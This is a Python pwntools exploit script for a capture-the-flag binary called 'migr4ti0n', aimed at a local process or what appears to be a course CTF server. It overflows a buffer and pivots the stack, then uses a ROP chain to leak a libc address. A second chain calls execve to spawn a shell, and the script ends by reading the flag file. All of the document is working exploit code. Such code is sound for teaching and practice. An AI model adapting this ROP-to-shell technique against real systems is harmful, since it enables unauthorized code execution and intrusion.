import time
from pwn import *
from struct import pack, unpack
LOCAL = True
binary = 'migr4ti0n'

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10132)

context.arch = 'amd64'

libc = ELF('libc.so.6')

BUF1 = 0x601200
BUF2 = 0x601300
READ_PLT = 0x400639
PUTS_GOT = 0x600fd8
PUTS_PLT = 0x4004d8

pop_rdi = 0x4006b3
pop_rdx = 0x4006d4
pop_rsi_r15 = 0x4006b1

p = 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaa' + p64(BUF1)
p += flat([
pop_rdi, PUTS_GOT,
PUTS_PLT,
pop_rsi_r15, BUF1, 0,
pop_rdx, 0x200,
READ_PLT,
])

print len(p)
#raw_input('pause')
r.readuntil('Try your best :\n')
r.send(p)

print 'waiting for leak...'
PUTS_GOT_leak = r.recvline().rstrip('\n')[::-1]
libc_base = int(PUTS_GOT_leak.encode('hex'), 16) - libc.symbols['puts']
print "libc_base:", hex(libc_base)

#raw_input('pause')
syscall = libc_base + 0xbc375
pop_rax = libc_base + 0x33544
pop_rsi = libc_base + 0x202e8
pop_rdx = libc_base + 0x1b92

p = p64(BUF2)
p += flat([
pop_rdi, libc_base+0x18cd17,
pop_rax, 59,
pop_rsi, 0,
pop_rdx, 0x0,
syscall
])
r.sendline(p)


time.sleep(0.2)
r.sendline('cat /home/' + binary + '/flag')
r.interactive()
